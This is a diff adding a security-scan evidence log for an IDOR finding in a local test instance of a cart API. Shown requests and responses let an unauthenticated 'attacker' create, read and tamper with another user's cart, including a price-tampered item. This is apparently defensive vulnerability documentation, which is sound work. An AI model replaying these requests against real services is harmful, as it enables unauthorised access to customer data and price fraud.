@@ -1,0 +1,16 @@
+================================================================
+EV-C1 : IDOR - unauthenticated read & modification of another user's cart  [2026-09-21 15:31:01]
+Target: http://localhost:3105  (temporary scan instance, dedicated scan DB)
+================================================================
+
+---- REQUEST ----
+POST http://localhost:3105/api/cart/add body: {userId:'victim-100', productId:'item-1', name, price, quantity}
+---- RESPONSE ----
+--- 1. Attacker creates a cart for victim-100 (identity fully client-controlled, no auth) ---
+{"userId":"victim-100","items":[{"productId":"item-1","name":"Chicken Burger","price":1200,"quantity":2,"image":"http://localhost:3001/uploads/b.png","_id":"6ab1005ea8bc9acb135d9ea6"}],"_id":"6ab1005ea8bc9acb135d9ea5","createdAt":"2026-09-21T10:01:02.360Z","updatedAt":"2026-09-21T10:01:02.360Z","__v":0}
+--- 2. Attacker reads victim-100 cart with no auth (GET /api/cart/:userId) ---
+{"_id":"6ab1005ea8bc9acb135d9ea5","userId":"victim-100","items":[{"productId":"item-1","name":"Chicken Burger","price":1200,"quantity":2,"image":"http://localhost:3001/uploads/b.png","_id":"6ab1005ea8bc9acb135d9ea6"}],"createdAt":"2026-09-21T10:01:02.360Z","updatedAt":"2026-09-21T10:01:02.360Z","__v":0}
+--- 3. Attacker adds a tampered-price item into victim-100 cart ---
+{"_id":"6ab1005ea8bc9acb135d9ea5","userId":"victim-100","items":[{"productId":"item-1","name":"Chicken Burger","price":1200,"quantity":2,"image":"http://localhost:3001/uploads/b.png","_id":"6ab1005ea8bc9acb135d9ea6"},{"productId":"Poison","name":"paid-by-victim","price":1,"quantity":1,"_id":"6ab1005ea8bc9acb135d9eac"}],"createdAt":"2026-09-21T10:01:02.360Z","updatedAt":"2026-09-21T10:01:02.459Z","__v":1}
+--- 4. Attacker removes an item from victim-100 cart ---
+{"_id":"6ab1005ea8bc9acb135d9ea5","userId":"victim-100","items":[{"productId":"Poison","name":"paid-by-victim","price":1,"quantity":1,"_id":"6ab1005ea8bc9acb135d9eac"}],"createdAt":"2026-09-21T10:01:02.360Z","updatedAt":"2026-09-21T10:01:02.517Z","__v":2}
